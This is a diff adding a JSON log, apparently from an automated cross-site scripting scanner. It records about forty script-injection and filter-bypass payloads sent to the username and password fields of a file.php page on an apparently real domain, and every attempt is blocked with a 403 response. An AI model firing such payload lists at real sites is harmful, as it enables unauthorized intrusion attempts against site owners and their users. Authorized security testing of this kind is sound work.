+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.479982"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.490526"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.501296"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.515692"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.531186"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.542136"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.552508"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.562790"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.573518"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.585922"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.597615"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.609224"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.620866"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.632616"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.644537"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.657541"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.680031"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.691359"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.703696"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.715469"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.727931"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.740202"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.752799"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.764813"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.776680"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.788592"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.799520"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.810901"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.822429"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.833682"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.846169"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.857523"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.868132"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.879266"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.890505"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.901586"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.913639"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.925167"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.937406"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.948829"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.958163"
+    },
+    {
+      "url": "http://healthmash.net/file.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:11.968388"
+    }
+  ]
+}
